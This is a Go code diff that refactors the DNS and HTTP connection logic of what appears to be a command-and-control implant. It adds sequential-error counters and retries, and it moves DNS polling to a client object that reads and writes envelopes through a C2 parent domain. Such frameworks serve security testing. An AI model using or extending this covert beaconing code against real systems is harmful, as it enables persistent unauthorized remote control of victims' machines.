@@ -515,6 +515,9 @@ func httpConnect(c2URI *url.URL) (*Connection, error) {
 					// {{if .Config.Debug}}
 					log.Printf("[http] error: %#v", err)
 					// {{end}}
+					if errCount < maxErrors {
+						continue
+					}
 					return
 				}
 			}
@@ -533,12 +536,13 @@ func dnsConnect(uri *url.URL) (*Connection, error) {
 	// {{if .Config.Debug}}
 	log.Printf("Attempting to connect via DNS via parent: %s\n", dnsParent)
 	// {{end}}
-	sessionID, sessionKey, err := dnsclient.DnsConnect(dnsParent)
+	pollTimeout := GetPollTimeout()
+	client, err := dnsclient.DNSConnect(dnsParent, pollTimeout)
 	if err != nil {
 		return nil, err
 	}
 	// {{if .Config.Debug}}
-	log.Printf("Starting new session with id = %s\n", sessionID)
+	log.Printf("Starting new session with id = %v\n", client)
 	// {{end}}
 
 	send := make(chan *pb.Envelope)
@@ -565,14 +569,45 @@ func dnsConnect(uri *url.URL) (*Connection, error) {
 	go func() {
 		defer connection.Cleanup()
 		for envelope := range send {
-			dnsclient.SendEnvelope(dnsParent, sessionID, sessionKey, envelope)
+			client.WriteEnvelope(envelope)
 		}
 	}()
 
-	pollTimeout := GetPollTimeout()
 	go func() {
+		errCount := 0 // Number of sequential errors
 		defer connection.Cleanup()
-		dnsclient.Poll(dnsParent, sessionID, sessionKey, pollTimeout, ctrl, recv)
+		for {
+			select {
+			case <-ctrl:
+				return
+			default:
+				envelope, err := client.ReadEnvelope()
+				switch err {
+				case nil:
+					errCount = 0
+					if envelope != nil {
+						recv <- envelope
+					}
+				case dnsclient.ErrTimeout:
+					errCount++
+					// {{if .Config.Debug}}
+					log.Printf("[dns] timeout")
+					// {{end}}
+					if errCount < maxErrors {
+						continue
+					}
+				default:
+					errCount++
+					// {{if .Config.Debug}}
+					log.Printf("[dns] error: %#v", err)
+					// {{end}}
+					if errCount < maxErrors {
+						continue
+					}
+					return
+				}
+			}
+		}
 	}()
 
 	activeConnection = connection
